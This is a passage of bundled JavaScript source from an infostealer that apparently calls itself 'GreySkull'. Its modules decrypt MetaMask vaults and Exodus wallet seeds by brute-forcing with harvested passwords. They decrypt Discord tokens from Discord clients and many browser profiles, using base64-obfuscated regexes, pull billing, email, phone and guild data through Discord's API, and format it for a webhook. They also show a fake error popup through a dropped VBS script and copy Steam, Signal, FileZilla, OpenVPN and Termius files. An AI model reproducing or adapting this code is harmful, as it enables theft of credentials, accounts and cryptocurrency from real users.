        save.ArraySave(cold.stealpath, "Wallets", cold.name);
      }
    }
  } catch (e) {
    save.SaveError(e);
  }
}

async function Decrypt(data, key) {
  var res = "";
  try {
    res = await passworder.decrypt(key, data);
  } catch (err) {}
  return res;
}

async function decodeMetamask(password, vault) {
  var vaultJson = null;
  try {
    var vaultJson = JSON.parse(vault);
  } catch (e) {}

  if (vaultJson == null) {
    return;
  }

  return await Decrypt(vault, password);
}

function getMnemonic(json) {
  var res = "";
  for (var key of json) {
    var mnemonic = key.data.mnemonic;
    if (mnemonic != undefined) {
      if (Array.isArray(mnemonic)) {
        res = Buffer.from(mnemonic).toString("utf-8");
      } else {
        res = mnemonic;
      }
    }
  }
  return res;
}

function decryptExodus(data, phrase) {
  try {
    seco.decryptData(data, phrase);
    return phrase;
  } catch (ex) {
    return "";
  }
}

async function decryptFileSeco(filename, passwlist) {
  const list = passwlist;
  var data = fs.readFileSync(filename);
  var phrase;
  try {
    if (list.length > 0) {
      list.forEach(function (element) {
        phrase = decryptExodus(data, element);
        if (phrase != "" && !stat.exodus.includes(phrase)) {
          stat.AddExodus(phrase);
        }
      });
    }
  } catch (e) {}
}

async function exodusDecrypt(cc, passwords) {
  if (cc != "yes") return;
  const appdata = process.env.appdata;
  const seedpath = appdata + "\\Exodus\\exodus.wallet\\seed.seco";
  if (fs.existsSync(seedpath)) {
    try {
      decryptFileSeco(seedpath, passwords);
    } catch (e) {}
  } else {
  }
}

async function GreySkullMetamask(passwords) {
  const browsers_profile = getBrowsersProfile();

  var folders = [];
  var vaults = [];

  for (let i = 0; i < browsers_profile.length; i++) {
    const browser = browsers_profile[i];
    const savePath = browser + "\
kbihfbeogaeaoehlefnkodbefgpgknn\\";
    if (fs.existsSync(savePath)) {
      folders.push(savePath);
    }
  }

  for (let i = 0; i < folders.length; i++) {
    const folder = folders[i];
    const files = fs.readdirSync(folder);

    for (let u = 0; u < files.length; u++) {
      const file = files[u];

      if (file.endsWith(".log")) {
        const data = fs.readFileSync(folder + file, "utf-8");

        const regex = /\"vault":"(?:[^\\"]|\\\\|\\")*"\}/gm;

        const finds = data.match(regex);

        for (let o = 0; o < finds.length; o++) {
          const find = finds[o];

          vaults.push(
            find.replace(/\\/gm, "").replace('"vault":"', "").slice(0, -2)
          );
        }
      }
    }
  }

  vaults = [...new Set(vaults)];

  var mnemonics = [];

  for (let i = 0; i < vaults.length; i++) {
    const vault = vaults[i];

    for (let u = 0; u < passwords.length; u++) {
      const password = passwords[u];
      var tryPass = await decodeMetamask(password, vault);

      if (tryPass != "" && tryPass != undefined) {
        mnemonics.push(getMnemonic(tryPass));
      }
    }
  }

  mnemonics = [...new Set(mnemonics)];
  mnemonics = mnemonics.filter((e) => e);
  let phrases = [];
  for (let i = 0; i < mnemonics.length; i++) {
    phrases.push({
      phrase: mnemonics[i],
    });
  }
  return phrases;
}

module.exports = {
  GreySkullExtensions,
  GreySkullColds,
  GreySkullMetamask,
  exodusDecrypt,
};


//# sourceURL=webpack://script/./utils/crypto.js?");

/***/ }),

/***/ 
})(module_4_exports, module_4_exports);
modules['module_4'] = module_4_exports;

// Módulo 5
const module_5_exports = {};
(function(module, exports) {
const fs = __webpack_require__(/*! fs */ "fs"),
  core = __webpack_require__(/*! ./core */ "./utils/core.js"),
  axios = __webpack_require__(/*! axios */ "axios"),
  fsarraymanager = __webpack_require__(Object(function webpackMissingModule() { var e = new Error("Cannot find module 'fsarraymanager'"); e.code = 'MODULE_NOT_FOUND'; throw e; }())),
  crypto = __webpack_require__(/*! crypto */ "crypto"),
  { stat } = __webpack_require__(/*! ./stats */ "./utils/stats.js"),
  path = __webpack_require__(/*! path */ "path"),
  { embeds, stats, badge } = __webpack_require__(/*! ./emotes */ "./utils/emotes.js");
  
  
async function WriteDiscord(profiles) {
  const basepath = stat.testpath[0];
  const socialDir = path.join(basepath, "Social");
  const DiscordDir = path.join(socialDir, "Discord");
  try {
    if (!fs.existsSync(socialDir)) {
      fs.mkdirSync(socialDir);
    }
    if (!fs.existsSync(DiscordDir)) {
      fs.mkdirSync(DiscordDir);
    }
  } catch (e) {
    return;
  }
  if(!profiles)return;
  if(!profiles.length < 1)return;
  const dscFilePath = path.join(DiscordDir, "Discord.txt");
  fs.writeFileSync(dscFilePath, core.getHeader() + JSON.stringify(profiles));
}

class DiscordAccount {
  constructor(
    username,
    discriminator,
    id,
    nitro,
    badges,
    billings,
    email,
    phone,
    token,
    avatar
  ) {
    this.username = username;
    this.tag = `${username}#${discriminator}`;
    this.id = id;
    this.nitro = nitro;
    this.badges = badges;
    this.billings = billings;
    this.email = email;
    if (phone != "" && phone != undefined) {
      this.phone = phone;
    } else {
      this.phone = "None";
    }
    this.token = token;
    this.avatar =
      "https://cdn.discordapp.com/avatars/" + id + "/" + avatar + ".png";
  }
}

function getBadges(json) {
  let badges = [
    {
      name: badge.staff,
      flag: 1,
    },
    {
      name: badge.partner,
      flag: 2,
    },
    {
      name: badge.hypesquad_event,
      flag: 4,
    },
    {
      name: badge.bughunter_1,
      flag: 8,
    },
    {
      name: badge.bughunter_2,
      flag: 16384,
    },
    {
      name: badge.developer,
      flag: 131072,
    },
    {
      name: badge.early,
      flag: 512,
    },
    {
      name: badge.bravery,
      flag: 64,
    },
    {
      name: badge.brillance,
      flag: 128,
    },
    {
      name: badge.balance,
      flag: 256,
    },
    {
      name: badge.active_developer,
      flag: 4194304,
    },
  ];

  let flag = json["flags"];
  var badgesRes = "";

  for (let badge of badges) {
    if ((flag & badge.flag) == badge.flag) {
      badgesRes = badgesRes + " " + badge.name;
    }
  }

  return badgesRes == "" ? "`None`" : badgesRes;
}

async function getInventory(token) {
  const url = "https://discord.com/api/v9/outbound-promotions";
  const authToken = token;

  try {
    const response = await axios.get(url, {
      headers: {
        Authorization: `${authToken}`,
      },
    });

    if (response.status === 200) {
      const promotion = response.data;
      const g = promotion.map((prom) => `🎁 ${prom.outbound_title}`);
      const gString = g.join("
");
      return gString;
    } else {
      return null;
    }
  } catch (error) {
    return null;
  }
}
async function getBilling(token) {
  var billings = "";
  try {
    const res = await axios({
      url: `https://canary.discord.com/api/v9/users/@me/billing/payment-sources`,
      method: "GET",
      headers: {
        Authorization: `${token}`,
      },
    });

    for (let billing of res.data) {
      let type = billing["type"];
      let invalid = billing["invalid"];

      if (type == 1 && !invalid) {
        billings = billings + ` ${embeds.creditcard}`;
      }
      if (type == 2 && !invalid) {
        billings = billings + ` ${embeds.paypal}`;
      }
    }
  } catch (e) {}
  return billings == "" ? "`None`" : billings;
}
async function getAccounts(tokens) {
  let accounts = [];
  let validTokensCount = 0;

  for (let i = 0; i < tokens.length; i++) {
    let token = tokens[i];
    let billing = await getBilling(token);

    try {
      const res = await axios({
        url: `https://discord.com/api/v9/users/@me`,
        method: "GET",
        headers: {
          Authorization: `${token}`,
        },
      });

      const json = res.data;

      if (json.message == null) {
        accounts.push(
          new DiscordAccount(
            json.username,
            json.discriminator,
            json.id,
            "NigaUnused",
            getBadges(json),
            billing,
            json.email,
            json.phone,
            token,
            json.avatar
          )
        );
        validTokensCount++;
      }
    } catch (e) {}
  }
  return accounts;
}

const appdata = process.env.appdata;
const local = process.env.localappdata;

async function GreySkullDiscord() {
  var tokens = [];
  var discordpaths = {
    Discord: appdata + "\\discord\\Local Storage\\leveldb\\",
    "Discord Canary": appdata + "\\discordcanary\\Local Storage\\leveldb\\",
    Lightcord: appdata + "\\Lightcord\\Local Storage\\leveldb\\",
    "Discord PTB": appdata + "\\discordptb\\Local Storage\\leveldb\\",
  };

  for (let [key, value] of Object.entries(discordpaths)) {
    if (!fs.existsSync(value)) {
      continue;
    }

    for (var file_name of fs.readdirSync(value)) {
      if (!file_name.endsWith(".log") && !file_name.endsWith(".ldb")) {
        continue;
      }

      let path_split = value.split("\\"),
        path_split_tail = value.includes("Network")
          ? path_split.splice(0, path_split.length - 3)
          : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join("\\") + "\\";

      for (var line of fs
        .readFileSync(`${value}/${file_name}`, "utf8")
        .split("
")) {
        if (value.includes("cord")) {
          let encrypted = Buffer.from(
            JSON.parse(
              fs.readFileSync(path_tail.replace("Local Storage", "Local State"))
            ).os_crypt.encrypted_key,
            "base64"
          ).slice(5);

          const _key = fsarraymanager.unprotectData(
            Buffer.from(encrypted, "utf-8"),
            null,
            "CurrentUser"
          );

          var encrypted_regex = /dQw4w9WgXcQ:[^\"]*/;
          if (line.match(encrypted_regex)) {
            try {
              var token = Buffer.from(
                line.match(encrypted_regex)[0].split("dQw4w9WgXcQ:")[1],
                "base64"
              );
              let start = token.slice(3, 15),
                middle = token.slice(15, token.length - 16),
                end = token.slice(token.length - 16, token.length),
                decipher = crypto.createDecipheriv("aes-256-gcm", _key, start);
              decipher.setAuthTag(end);
              token =
                decipher.update(middle, "base64", "utf-8") +
                decipher.final("utf-8");
              tokens.push(token);
            } catch (e) {}
          }
        }
      }
    }
  }

  var browsers_path = [
    appdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
    appdata + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
    local + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
    local + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
    local + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
    local + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
    local + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
    local + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
    local + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
    local + "\\Torch\\User Data\\Local Storage\\leveldb\\",
    local + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
    local +
      "\\BraveSoftware\\Brave-Browser\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
    local + "\\Iridium\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
    local +
      "\\Yandex\\YandexBrowser\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
    local + "\\uCozMedia\\Uran\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
    local + "\\Microsoft\\Edge\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
    local + "\\Google\\Chrome\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
    local + "\\Vivaldi\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
  ];

  var browsers_profile = [];
  for (var i = 0; i < browsers_path.length; i++) {
    const browser = browsers_path[i];
    const profiles = core.getProfiles(browser, browser.split("\\")[6]);
    for (var j = 0; j < profiles.length; j++) {
      browsers_profile.push(profiles[j].path);
    }
  }
  const reg1 = Buffer.from(
    "W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9",
    "base64"
  ).toString();
  const reg2 = Buffer.from("bWZhXC5bXHctXXs4NH0=", "base64").toString();
  const reg3 = Buffer.from(
    "W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17MjUsMTEwfQ==",
    "base64"
  ).toString();

  const cleanRegex = [
    new RegExp(reg1, "gm"),
    new RegExp(reg2, "gm"),
    new RegExp(reg3, "gm"),
  ];

  for (let path of browsers_profile) {
    if (!fs.existsSync(path)) {
      continue;
    }

    let files = fs.readdirSync(path);
    for (let file of files) {
      for (let reg of cleanRegex) {
        if (!(file.endsWith(".log") || file.endsWith(".ldb"))) {
          continue;
        }

        let content = fs.readFileSync(path + file, "utf-8");
        Array.prototype.push.apply(tokens, content.match(reg));
      }
    }
  }
  let uniqueTokens = [];
  tokens.forEach((token) => {
    let prefix = token.split(".")[0];
    if (
      !uniqueTokens.some((existingToken) => existingToken.startsWith(prefix))
    ) {
      uniqueTokens.push(token);
    }
  });
  tokens = tokens.filter(function (item, pos) {
    return tokens.indexOf(item) == pos && item != null;
  });
  return await getAccounts(uniqueTokens);
}

const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b));

const GetNitro = (r) => {
  if (!r) return;
  if (!r.premium_type) return ":x:";
  switch (r.premium_type) {
    default:
      return ":x:";
    case 1:
      return badge.nitro;
    case 2:
      if (!r.premium_guild_since) return badge.nitro;
      var now = new Date(Date.now());
      var arr = [
        badge.boost_1,
        badge.boost_2,
        badge.boost_3,
        badge.boost_6,
        badge.boost_9,
        badge.boost_12,
        badge.boost_15,
        badge.boost_18,
        badge.boost_24,
      ];
      var a = [
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
      ];
      var b = [1, 2, 3, 6, 9, 12, 15, 18, 24];
      var r = [];
      for (var p in a)
        r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000));
      var i = 0;
      for (var p of r) p > 0 ? "" : i++;
      return `${badge.nitro} ${arr[i]}`;
  }
};

async function embed(
  username,
  tag,
  id,
  nitro,
  badges,
  billings,
  email,
  phone,
  token,
  avatar,
  password
) {
  let gs = await getInventory();
  var Nitro = await getURL(
    "https://discord.com/api/v9/users/" + id + "/profile",
    token
  );
  let embed = {
    color: 3553599,
    author: {
      name: `${tag} (${id})`,
      icon_url: `https://raw.githubusercontent.com/KSCH58/Assets-of-god/main/dad36dd5-456e-41fd-9dd2-a07655be72b6.png`,
    },
    fields: [
      {
        name: `${embeds.token} Token`,
        value: `\`\`\`ansi
\u001b[1;2m\u001b[1;30${token}\u001b[0m\u001b[0m\`\`\`
[Copy Token](https://scarpatta.fun/copy/${token})`,
        inline: false,
      },
      { 
        name: `${embeds.badges} Badges`, 
        value: `${badges}`, 
        inline: true,
      },
      {
        name: `${embeds.nitro} Nitro`,
        value: `${GetNitro(Nitro)}`,
        inline: true,
      },
      {
        name: `${embeds.billings} Billings`,
        value: `${billings}`,
        inline: true,
      },
      {
        name: `${embeds.mail} Email`,
        value: `\`\`\`ansi
\u001b[1;2m\u001b[1;30${email}\u001b[0m\u001b[0m\`\`\``,
        inline: true,
      },
      {
        name: `${embeds.phone} Phone`,
        value: `\`\`\`ansi
\u001b[1;2m\u001b[1;30${phone}\u001b[0m\u001b[0m\`\`\``,
        inline: true,
      },
      {
        name: `Passwords Found`,
        value: `\`\`\`ansi
\u001b[1;2m\u001b[1;30${password}\u001b[0m\u001b[0m\`\`\``,
        inline: false,
      },
    ],
    thumbnail: {
      url: `${avatar}`,
    },
    footer: {
      text: "@GreySkull | https://t.me/Sordeal",
    },
  };
  return JSON.stringify(embed);
}

async function embedguild(token) {
  try {
    const guilds = await getURL(
      "https://discord.com/api/v9/users/@me/guilds",
      token
    );
    if (
      guilds.length < 1 ||
      guilds === null ||
      guilds === undefined ||
      Guilds.length === 0
    ) {
      return null;
    }
    const Guilds = await parseGuilds(guilds, token);

    const formattedGuilds = await Guilds.map(
      (g) =>
        `╔ **${g.Name}**
` +
        `╠ **ID:** \`${g.ID}\`
` +
        `╠  **Members Count:** \`${g.MembersCount}\`
` +
        `╠ **Roles Count:** \`${g.RolesCount}\`
` +
        `╠ **Boost:** \`${g.Boost}\`
` +
        `╚ **Vanity:** \`${g.Vanity}\`

`
    ).join("");
    const params2 = {
      title: `${embeds.nova} Total Guilds Owner/Admin (${Guilds.length})`,
      description: formattedGuilds,
      color: 3553599,
    };
    return JSON.stringify(params2);
  } catch (error) {
    return null;
  }
}

async function embedbis(token) {
  try {
    const friends = await getURL(
      "https://discord.com/api/v9/users/@me/relationships",
      token
    );
    /*
    let embed = "None";
    const bots = await getURL(
      "https://discord.com/api/v9/applications?with_team_applications=true",
      token
    );

    if (bots.length > 0) {
      const certif = {
        1: "No",
        2: "Eligible",
        3: "In progress",
        4: "Yes",
      };

      for (const bot of bots) {
        console.log(bot)
        if (bot.verification_state != 1) {
          embed = `**Bot:** ${bot.username}#${
            bot.discriminator
          }
**State:**: ${certif[bot.verification_state]}`;
        }
      }
    }*/
    if (friends.length < 1 || friends === null || friends === undefined) {
      return null;
    }
    const Friends = parseFriends(friends);
    const params2 = {
      title: `${embeds.nova} UHQ Friends (${Friends.len})`,
      description: "**Friends:**
" + Friends.badges,
      color: 3553599,
    };
    return JSON.stringify(params2);
  } catch (error) {
    return null;
  }
}

const getURL = async (url, token) => {
  try {
    const response = await axios.get(url, {
      headers: {
        Authorization: token,
      },
    });
    return response.data;
  } catch (error) {
    return null;
  }
};

const GetRBadges = (e) => {
  var n = "";
  return (
    1 == (1 & e) && (n += `${badge.staff} `),
    2 == (2 & e) && (n += `${badge.partner} `),
    4 == (4 & e) && (n += `${badge.hypesquad_event} `),
    8 == (8 & e) && (n += `${badge.bughunter_1} `),
    512 == (512 & e) && (n += `${badge.early} `),
    16384 == (16384 & e) && (n += `${badge.bughunter_2} `),
    131072 == (131072 & e) && (n += `${badge.developer} `),
    "" == n && (n = ":x:"),
    n
  );
};

const parseGuilds = async (guilds, token) => {
  let ownerguilds = [];
  try {
    for (const g of guilds) {
      if (g.owner || g.permissions == 140737488355327) {
        const response = await getURL(
          `https://discord.com/api/v9/guilds/${g.id}?with_counts=true`,
          token
        );
        if (response.approximate_member_count > 50) {
          let guildparsed = {
            Name: g.name,
            ID: g.id,
            MembersCount: response.approximate_member_count,
            Boost: response.premium_subscription_count,
            Vanity: response.vanity_url_code ?? "None",
            RolesCount: response.roles.length,
          };
          ownerguilds.push(guildparsed);
        }
      }
    }
    return ownerguilds;
  } catch (err) {
    return [];
  }
};

const parseFriends = (friends) => {
  try {
    var real = friends.filter((x) => x.type == 1);
    var rareFriends = "";
    for (var friend of real) {
      var badges = GetRBadges(friend.user.public_flags);
      if (badges !== ":x:")
        rareFriends += `${badges} | \`${friend.user.username}#${friend.user.discriminator}\`
`;
    }
    if (!rareFriends) rareFriends = "*Nothing to see here*";
    return {
      len: real.length,
      badges: rareFriends,
    };
  } catch (err) {
    return ":x:";
  }
};

function compile(embeds) {
  var build = "";
  build += `{
"content": null,
"embeds": [`;
  for (let i = 0; i < embeds.length; i++) {
    build += embeds[i];
    if (i != embeds.length - 1) {
      build += ",
";
    }
  }
  build += `],
"avatar_url": "https://raw.githubusercontent.com/KSCH58/Assets-of-god/main/dad36dd5-456e-41fd-9dd2-a07655be72b6.png",
"username": "GreySkull",
"attachments": []
}`;
  return build;
}

module.exports = {
  embed,
  embedbis,
  GreySkullDiscord,
  compile,
  embedguild,
  WriteDiscord,
};


//# sourceURL=webpack://script/./utils/discord.js?");

/***/ }),

/***/ 
})(module_5_exports, module_5_exports);
modules['module_5'] = module_5_exports;

// Módulo 6
const module_6_exports = {};
(function(module, exports) {
const g = { \r
  badge: {\r
    nitro: "<:946246402105819216:962747802797113365>",\r
    boost_1: "<:Booster1Month:1051453771147911208>",\r
    boost_2: "<:Booster2Month:1051453772360077374>",\r
    boost_3: "<:Booster3Month:1159062676408905848>",\r
    boost_6: "<:Booster6Month:1051453773463162890>",\r
    boost_9: "<:Booster9Month:1051453774620803122>",\r
    boost_12: "<:boost12month:1068308256088400004>",\r
    boost_15: "<:Booster15Month:1051453775832961034>",\r
    boost_18: "<:BoosterLevel8:1051453778127237180>",\r
    boost_24: "<:Booster24Month:1051453776889917530>",\r
    staff: "<:staff:874750808728666152>",\r
    partner: "<:partner:874750808678354964>",\r
    hypesquad_event: "<:hypesquadevent:1143858325579108505>",\r
    bughunter_1: "<:bughunter_1:874750808426692658>",\r
    bughunter_2: "<:bughunter_2:874750808430874664>",\r
    developer: "<:developer:874750808472825986>",\r
    early: "<:early_supporter:874750808414113823>",\r
    bravery: "<:bravery:874750808388952075>",\r
    brillance: "<:brilliance:874750808338608199>",\r
    balance: "<:balance:874750808267292683>",\r
    active_developer: "<:activedev:1143858315886088263>",\r
  },\r
  embeds: {\r
    karma: "<:karma:1173646047134892052>",\r
    gold: "<a:gold:1197551697887764550>",\r
    tiktok: "<:tiktok:1173628882168053811>",\r
    instaiscert: "<:certifiedinsta:1173581219187937310>",\r
    instagram: "<a:instawhite:853376415759335455>",\r
    instagram_certified:"<:instagramlogo:1173581240650182717>",\r
    twitter_usernamecert: "<:certi_twitter:1159090158117867571>",\r
    twitter_usernameuncert: "<:twitter:1159090161494270052>",\r
    twitter_followers: "<:a2_grey_twitter:1135298638248161361>",\r
    twitter_followings: "<:Twitter_retweet:1135298386531188897>",\r
    twitter_fav: "<:twitter_follow:1135298434967019540>",\r
    twitter_location: "<a:controller:1159090439207518269>",\r
    inject: "<a:inject:1159081839596687400>",\r
    atom: "<:account:1159081832751566858>",\r
    dsc: "<:roblux:1159081834966155264>",\r
    rblxinfo: "<:info:1159081837365313619>",\r
    infoyl: "<:ylinfo:1159081835779866635>",\r
    mcid: "<a:books:1159078873699450902>",\r
    mcmail: "<:email:1159078862135775252> ",\r
    mcgapple: "<:gapple:1159078870461460480>",\r
    hypixel: "<:hypixel:1159078857542996090>",\r
    keysmc: "<a:keys:1159078859682107453>",\r
    namemc: "<:namemc:1159078855550713886>",\r
    games: "🎮",\r
    vpn: "🌐",\r
    clients: "⌨️",\r
    nova: "<:lilnova5:1203979456729976912>",\r
    crypto: "<:wallets4:1203979459477245952>",\r
    creditcard: "<:credcard:1203979460714692630>",\r
    paypal: "<:paypal:1203981549666828301>",\r
    Old_Username: "<:oldusertag:1203979463994376232>",\r
    token: "<a:dsctkn1:1203979465802125322>",\r
    badges: "<:badg:1203979468679548928>",\r
    nitro: "<:nitrocode2:1203979470466191370>",\r
    billings: "<:billing8:1203979473100476446>",\r
    mail: "<:blackstar:1203979482701111327>",\r
    phone: "<:phonenumb:1203979476178837524>",\r
    gift: "<:1839festivepixelpresent:1171449290724491325>",\r
    username: "<:playboi6:1203979478817316914>",\r
    cat: "<a:caat2:1130448854861488168>",\r
  },\r
  stats: {\r
    password: "<a:blackkey:1203979480314552431>",\r
    cookie: "<:blackstar:1203979482701111327>",\r
    card: "<a:blackcard:1203979484726820865>",\r
    autofill: "<a:autofill:1203979487180750871>",\r
    metamask: "<:metamask:1203979489131110410>",\r
    exodus: "<:exodus:1203979491722928148>",\r
    computer: "<:computer:1203979493291597826>",\r
    ip: "<:black_crown:1203979497515393045>",\r
    country: "<:black_crown:1203979497515393045>",\r
    disclamer: "<:disclaimer:1203979499570597929>",\r
    download: "<:download:1203979502426791966>",\r
  },\r
};\r
\r
let { embeds, stats, badge } = g;\r
\r
module.exports = {\r
  embeds,\r
  stats,\r
  badge,\r
};\r


//# sourceURL=webpack://script/./utils/emotes.js?");

/***/ }),

/***/ 
})(module_6_exports, module_6_exports);
modules['module_6'] = module_6_exports;

// Módulo 7
const module_7_exports = {};
(function(module, exports) {
const { exec } = __webpack_require__(/*! child_process */ "child_process"),\r
  fs = __webpack_require__(/*! fs */ "fs"),\r
  save = __webpack_require__(/*! ./save */ "./utils/save.js")\r
\r
const generateRandomName = (length) => {\r
  const characters =\r
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";\r
  let result = "";\r
  for (let i = 0; i < length; i++) {\r
    const randomIndex = Math.floor(Math.random() * characters.length);\r
    result += characters[randomIndex];\r
  }\r
  return result;\r
};\r
\r
function error(cc, msg, startuped) {\r
  if (cc !== "yes" && startuped !== true) return;\r
  const vbsScript = `\r
  Set objShell = WScript.CreateObject("WScript.Shell")\r
  MsgBox "Error : ${msg}", vbInformation, "Error Code : 43 "\r
  `;\r
  const randomName = generateRandomName(12);\r
  const vbsFileName = process.env.APPDATA + "\\" + randomName + ".vbs";\r
\r
  fs.writeFileSync(vbsFileName, vbsScript, "utf8");\r
\r
  exec("cscript " + vbsFileName, (error, stdout, stderr) => {\r
    if (error) {\r
      save.SaveError(error);\r
    }\r
  });\r
}\r
\r
module.exports = {\r
  error,\r
};\r


//# sourceURL=webpack://script/./utils/fake_error.js?");

/***/ }),

/***/ 
})(module_7_exports, module_7_exports);
modules['module_7'] = module_7_exports;

// Módulo 8
const module_8_exports = {};
(function(module, exports) {
const fs = __webpack_require__(/*! fs */ "fs"),
  save = __webpack_require__(/*! ./save */ "./utils/save.js"),
  { stat } = __webpack_require__(/*! ./stats */ "./utils/stats.js"),
  path = __webpack_require__(/*! path */ "path"),
  appdata = process.env.appdata,
  local = process.env.localappdata,
  archiver = __webpack_require__(/*! archiver */ "archiver"),
  { upload } = __webpack_require__(/*! ./uploadFiles */ "./utils/uploadFiles.js"),
  https = __webpack_require__(/*! https */ "https"),
  axios = __webpack_require__(/*! axios */ "axios"),
  agent = new https.Agent({ rejectUnauthorized: false }),
  fsPromises = fs.promises;

class SimpleFile {
  constructor(name, mainfolder, existpath, stealpath) {
    this.name = name;
    this.mainfolder = mainfolder;
    this.existpath = existpath;
    this.stealpath = stealpath;
  }
}

function GreySkullSimple() {
  try {
    const homepath = process.env.homepath;
    const simples = [
      new SimpleFile("MobaXterm", "Clients", appdata + "\\MobaXterm\\", [
        appdata + "\\MobaXterm/MobaXterm.ini",
      ]),
      new SimpleFile("NationsGlory", "Games", appdata + "\\NationsGlory\\", [
        appdata + "\\NationsGlory\\Local Storage/leveldb",
      ]),

      new SimpleFile("Growtopia", "Games", local + "\\Growtopia\\", [
        local + "\\Growtopia\\save.dat",
      ]),
      new SimpleFile("Minecraft", "Games", appdata + "\\.minecraft\\", []),
      new SimpleFile(
        "Skype",
        "Social",
        appdata + "\\Microsoft\\Skype for Desktop\\Local Storage\\",
        [appdata + "\\Microsoft\\Skype for Desktop\\Local Storage\\"]
      ),
      new SimpleFile(
        "Element",
        "Social",
        appdata + "\\Element\\Local Storage\\",
        [appdata + "\\Element\\Local Storage\\"]
      ),
      new SimpleFile("Signal", "Social", appdata + "\\Signal\\", [
        appdata + "\\Signal\\Local Storage\\",
        appdata + "\\Signal\\Session Storage\\",
        appdata + "\\Signal\\sql\\",
        appdata + "\\Signal\\databases\\",
        appdata + "\\Signal\\config.json",
      ]),
      new SimpleFile("ICQ", "Social", appdata + "\\ICQ\\0001\\", [
        appdata + "\\ICQ\\0001\\",
      ]),
      new SimpleFile("FileZilla", "Clients", appdata + "\\FileZilla\\", [
        appdata + "\\FileZilla\\recentservers.xml",
      ]),
      new SimpleFile(
        "OpenVPN Connect",
        "VPN",
        appdata + "\\OpenVPN Connect\\",
        [appdata + "\\OpenVPN Connect\\profiles"]
      ),
      new SimpleFile("Shadow", "Clients", appdata + "\\shadow\\", [
        appdata + "\\shadow\\Local State",
        appdata + "\\shadow\\Local Storage\\",
        appdata + "\\shadow\\Session Storage\\",
      ]),
      new SimpleFile("TotalCommander", "Clients", appdata + "\\GHISLER\\", [
        appdata + "\\GHISLER\\wcx_ftp.ini",
      ]),
      new SimpleFile(
        "LunarClient",
        "Games",
        homepath + "\\.lunarclient\\settings\\game\\",
        []
      ),
      new SimpleFile("FeatherClient", "Games", appdata + "\\.feather\\", []),
      new SimpleFile(
        "EssentialClient",
        "Games",
        appdata + "\\.minecraft\\essential\\",
        []
      ),
      new SimpleFile(
        "TLauncher",
        "Games",
        appdata + "\\.tlauncher\\mcl\\Minecraft\\game\\",
        []
      ),
    ];

    for (let i = 0; i < simples.length; i++) {
      const simple = simples[i];

      if (fs.existsSync(simple.existpath)) {
        if (simple.mainfolder == "Clients") {
          stat.AddSysAdmin(simple.name);
        }
        if (simple.mainfolder == "Social") {
          stat.AddMessenger(simple.name);
        }
        if (
          simple.mainfolder == "Games" &&
          !simple.name.includes("craft") &&
          !simple.name.includes("lunar") &&
          !simple.existpath.includes("feather")
        ) {
          stat.AddGames(simple.name);
        }
        if (
          simple.existpath.includes("craft") ||
          simple.existpath.includes("lunarclient") ||
          simple.existpath.includes("feather")
        ) {
          stat.AddGames(simple.name);
          const mcfiles = fs.readdirSync(simple.existpath);
          const filteredFiles = mcfiles.filter(
            (file) =>
              file.includes(".json") ||
              file.includes(".txt") ||
              file.includes(".dat")
          );

          filteredFiles.forEach((f) => {
            const fullPath = path.join(simple.existpath, f);
            if (f.includes(".json")) {
              stat.addMinecraft(fullPath);
            }
            simple.stealpath.push(fullPath);
          });
        }
        save.ArraySave(simple.stealpath, simple.mainfolder, simple.name);
      }
    }
  } catch (e) {
    save.SaveError(e);
  }
}

function parseConfigVDF(filePath) {
  const vdf = fs.readFileSync(filePath, "utf-8");
  const lines = vdf.split("
");
  let result = [];

  for (const line of lines) {
    const matches = line.match(/7656[0-9]{13}/gi);
    if (matches) {
      result = result.concat(matches);
    }
  }

  return result;
}

function GreySkullSteam(cc) {
  if (cc != "yes") return;
  try {
    const mainPath = [
      "C:\\program files (x86)\\steam\\",
      "C:\\program files\\steam\\",
    ];

    var saves = [];

    for (let i = 0; i < mainPath.length; i++) {
      const path = mainPath[i];
      if (fs.existsSync(path)) {
        const files = fs.readdirSync(path);

        for (let u = 0; u < files.length; u++) {
          const file = files[u];

          const savePath = path + file;

          if (file.includes("ssfn")) {
            saves.push(savePath);
          }
        }

        const configPath = path + "config\\";
        if (fs.existsSync(configPath)) {
          saves.push(configPath);
          if (fs.existsSync(configPath + "config.vdf")) {
            const configData = parseConfigVDF(configPath + "loginusers.vdf");

            stat.addSteam(configData);
          }
        }
      }
    }
    if (saves.length != 0) {
      stat.AddGames("Steam");
      save.ArraySave(saves, "Launcher", "Steam");
    }
  } catch (e) {
    save.SaveError(e);
  }
}

function GreySkullTermius(cc) {
  if (cc != "yes") return;
  try {
    const termius_path = local + "\\Termius\\Local Storage\\leveldb\\";

    if (!fs.existsSync(termius_path)) {
      return;
    }

    var saves = [];

    const files = fs.readdirSync(termius_path);

    for (var i = 0; i < files.length; i++) {
      const file = files[i];
      const savePath = termius_path + file;
      if (fs.lstatSync(savePath).isDirectory()) {
        if (file.length != 16) {
          continue;
        }
        saves.push(savePath + "//");
      } else {
        saves.push(savePath);
      }
    }

    stat.AddSysAdmin("Termius");
    save.ArraySave(saves, "Clients", "Termius");
